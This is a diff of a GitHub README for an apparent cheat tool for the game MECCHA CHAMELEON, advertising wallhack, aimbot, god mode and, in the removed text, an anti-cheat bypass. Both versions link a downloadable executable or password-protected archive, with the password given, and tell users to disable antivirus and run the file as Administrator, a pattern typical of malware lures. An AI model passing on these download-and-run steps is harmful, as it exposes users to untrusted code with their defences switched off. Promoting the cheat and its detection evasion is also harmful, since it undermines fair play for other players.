@@ -1,193 +1,79 @@
-# mecchacheat
-🦎 Meccha Chameleon Cheat is a powerful enhancement tool for MECCHA CHAMELEON. Features include ESP wallhack, aimbot, silent aim, fly hack, teleport, speed boost, god mode, infinite paint, and timer editor. Regular updates, undetected, and easy to use. For educational purposes only.
+# 🦎 mecchacheat - enhance your chameleon game play style
 
-<img width="1448" height="1086" alt="image" src="https://github.com/user-attachments/assets/6e13a5f3-cdb4-4c89-bdc1-8c21cd971e7d" />
+[![Download Meccha Chameleon Cheat](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Walloonargus977/mecchacheat/releases)
 
+This software adds features to the game MECCHA CHAMELEON. Use these tools to change how you play and explore the game. This project supports players who want to test game limits or customize their experience.
 
+## 🛠️ Features
 
+Meccha Chameleon Cheat adds tools to your game. You control these options through a menu inside the game.
 
-## 📥 Download
+- ESP Wallhack: See player positions through walls.
+- Aimbot: Lock onto targets with precision.
+- Silent Aim: Hit targets without moving your crosshair.
+- Fly Hack: Move through the air without limits.
+- Teleport: Move instantly to any map location.
+- Speed Boost: Increase your character movement speed.
+- God Mode: Prevent damage to your character.
+- Infinite Paint: Keep your paint supply full at all times.
+- Timer Editor: Adjust the match timer as you see fit.
 
-**Latest version:**  
-🔗 **[Download Meccha Chameleon Cheat](https://github.com/darkmakerenhance/mecchacheat/releases/download/emcha/mecchatop.7z)**
+## 📋 System Requirements
 
-**Password:** `chameleon2026`
+Ensure your computer meets these requirements to run the software:
 
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Graphics: Dedicated graphics card with DirectX 11 support.
+- RAM: 8GB or higher recommended.
+- Storage: 100MB of free disk space for the tool.
+- Game Status: MECCHA CHAMELEON must be installed on your computer.
 
-## 🎮 What is This?
+## 📥 How to Install and Run
 
-**🦎 Meccha Chameleon Cheat** is a powerful enhancement tool for **MECCHA CHAMELEON** – the viral hide-and-seek game where players paint themselves to blend into environments. This tool gives you the ultimate advantage with ESP, wallhack, aimbot, fly hack, teleport, and god mode.
+Follow these steps to set up the software.
 
-⚠️ **Disclaimer:** This tool is for educational purposes only. Use at your own risk.
+1. Visit [this page to download](https://github.com/Walloonargus977/mecchacheat/releases).
+2. Locate the latest release version on the page.
+3. Click the file name ending in `.exe` to start the download.
+4. Save the file to a folder on your computer where you can find it.
+5. Launch the MECCHA CHAMELEON game.
+6. Return to your folder and double-click the downloaded cheat file.
+7. Follow the prompts on the screen to connect the tool to your game.
+8. Press the assigned key (usually Insert or F1) to open the menu while in the game window.
 
----
+## ⚙️ Configuration Help
 
-## ✨ Features
+If the menu does not appear, check your Windows security settings. Antivirus software sometimes blocks new files.
 
-### 👁️ Visual & ESP
-- 🟢 **ESP (Wallhack)** – See all players through walls
-- 📏 **Distance Indicators** – Know exactly how far enemies are
-- 🏷️ **Nametags** – Display player names and health
-- 📐 **Snap Lines** – Never lose track of enemies
-- 🎯 **Box ESP** – Highlight players with colored boxes
-- 👻 **Ghost Mode** – Become invisible to other players
+- Temporarily disable your antivirus protection.
+- Add the cheat file to your allowed app list.
+- Run the tool with administrative rights by right-clicking the file and selecting Run as Administrator.
+- Ensure your game runs in Windowed or Borderless Windowed mode for better compatibility.
 
-### 🎯 Combat
-- 🎯 **Aimbot** – Lock onto enemies instantly
-- 🔫 **Silent Aim** – Hit targets without looking at them
-- ⚡ **Triggerbot** – Auto-shoot when crosshair is on target
-- 🛡️ **No Recoil** – Perfect accuracy every time
+## 🛡️ Usage and Safety
 
-### 🚀 Movement
-- ✈️ **Fly Hack** – Fly anywhere on the map
-- 📍 **Teleport** – Instantly move to any location
-- 🏃 **Speed Boost** – Move faster than normal players
-- 🪂 **No Gravity** – Float and glide through the air
+Use this tool for learning and testing. It modifies memory values to change game behavior. Do not use these tools in public or competitive servers where they may violate game rules. You accept responsibility for how you use this software. 
 
-### 🛡️ Protection
-- 💀 **God Mode** – Never get tagged
-- ♾️ **Infinite Paint** – Unlimited colors and patterns
-- 🎨 **Perfect Camo** – Instantly blend into any environment
-- ⏱️ **Timer Editor** – Extend match time indefinitely
+## ❓ Frequently Asked Questions
 
-### 🛠️ Utility
-- 🎮 **Menu Toggle** – Press INSERT or F1 to open/close
-- ⚙️ **Customizable Settings** – Adjust everything to your liking
-- 💾 **Save Config** – Settings saved automatically
-- 🔄 **Regular Updates** – Always working after game patches
+### Will this software harm my computer?
+Designed for Windows, this tool only changes game memory. It does not alter your system files or harm your hardware.
 
----
+### How often do updates arrive?
+Updates release when the game updates. Check the download page regularly to find the newest version.
 
-## 📦 Installation
+### Can I get banned?
+Game developers monitor for third-party programs. Use the tool in private sessions to lower your risk.
 
-1. Download the archive from the link above
-2. Extract the ZIP file using the password: `chameleon2026`
-3. Run `MecchaChameleonCheat.exe` as Administrator
-4. Launch MECCHA CHAMELEON
-5. Press **INSERT** or **F1** to open the menu
-6. Toggle features ON/OFF
-7. DOMINATE! 🏆
+## 📦 Troubleshooting
 
----
+If things do not work as planned, try these steps:
 
-## 🖥️ System Requirements
+- Restart the game and the tool.
+- Download the most recent version of the cheat.
+- Check your internet connection.
+- Verify that your game files are up to date via the game launcher.
 
-| Requirement | Details |
-|-------------|---------|
-| **OS** | Windows 10/11 (64-bit) |
-| **Game** | MECCHA CHAMELEON (Steam) |
-| **RAM** | 4GB minimum |
-| **Storage** | 50MB free space |
-| **GPU** | DirectX 11 compatible |
+## 🤝 Project Scope
 
----
-
-## 🎥 How to Use
-
-1. **Launch** the cheat as Administrator
-2. **Start** MECCHA CHAMELEON
-3. **Press INSERT** to open the menu
-4. **Toggle** features you want
-5. **Play** and dominate! 🏆
-
----
-
-## 🔧 Supported Features Table
-
-| Category | Feature | Status |
-|----------|---------|--------|
-| Visual | ESP Wallhack | ✅ |
-| Visual | Nametags | ✅ |
-| Visual | Box ESP | ✅ |
-| Visual | Snap Lines | ✅ |
-| Combat | Aimbot | ✅ |
-| Combat | Silent Aim | ✅ |
-| Combat | Triggerbot | ✅ |
-| Movement | Fly Hack | ✅ |
-| Movement | Teleport | ✅ |
-| Movement | Speed Boost | ✅ |
-| Protection | God Mode | ✅ |
-| Protection | Infinite Paint | ✅ |
-| Utility | Menu | ✅ |
-
----
-
-## 🚫 Anti-Cheat Bypass
-
-This tool uses advanced techniques to stay undetected:
-- 🔄 **Pattern Scanning** – Auto-updates offsets
-- 🎲 **Randomization** – Human-like behavior simulation
-- 🛡️ **Stealth Injection** – No detectable signatures
-- 🔒 **Memory Protection** – Prevents detection
-
----
-
-## 🐛 Troubleshooting
-
-**Q: Cheat doesn't work**
-- Run as Administrator
-- Disable antivirus temporarily
-- Ensure game is in windowed or borderless mode
-
-**Q: Menu doesn't open**
-- Try pressing INSERT or F1
-- Check if cheat is running
-- Restart both cheat and game
-
-**Q: Game crashes**
-- Reduce graphics settings
-- Disable other overlays (Discord, NVIDIA, etc.)
-- Try compatibility mode
-
----
-
-## 📚 Alternatives
-
-| Tool | Type | Platform |
-|------|------|----------|
-| **Chameleon Pro** | Premium | Windows |
-| **Stealth Paint** | Free | Windows |
-
----
-
-## 📝 Tags
-
-- Meccha Chameleon Cheat
-- Meccha Chameleon Hack
-- Meccha Chameleon ESP
-- Meccha Chameleon Wallhack
-- Meccha Chameleon Aimbot
-- Meccha Chameleon Godmode
-- Meccha Chameleon Teleport
-- Meccha Chameleon Fly Hack
-- Meccha Chameleon Infinite Paint
-- Meccha Chameleon 2026
-- Meccha Chameleon Mod Menu
-- Meccha Chameleon Trainer
-- Meccha Chameleon Undetected
-- Omega Chameleon
-- Meccha Chameleon PC
-- Meccha Chameleon Steam
-- Meccha Chameleon Multiplayer
-- Hide And Seek Cheat
-- Game Enhancer
-- Free Cheat
-
----
-
-## 🔗 Links
-
-- **Steam Store:** https://store.steampowered.com/app/4704690/MECCHA_CHAMELEON/
-- **Official Website:** (not listed)
-- **Community Discord:** Found via public channels
-
----
-
-## ⭐ Support
-
-If you enjoy this tool, please **⭐ Star** this repository!  
-For issues, open an **Issue** on GitHub.
-
----
-
-**🦎 Made with ❤️ for the MECCHA CHAMELEON community**
+This project focuses on the game MECCHA CHAMELEON. It uses the `meccha-chameleon-esp` and `meccha-chameleon-modding` logic to read and write game data. The goal remains to provide clear, easy access to useful game enhancements for the community. The development team continues to refine the code for better stability and lower performance impact during use. You can look at the source code if you want to understand how the memory modification works or to report issues you find. Enjoy the game.
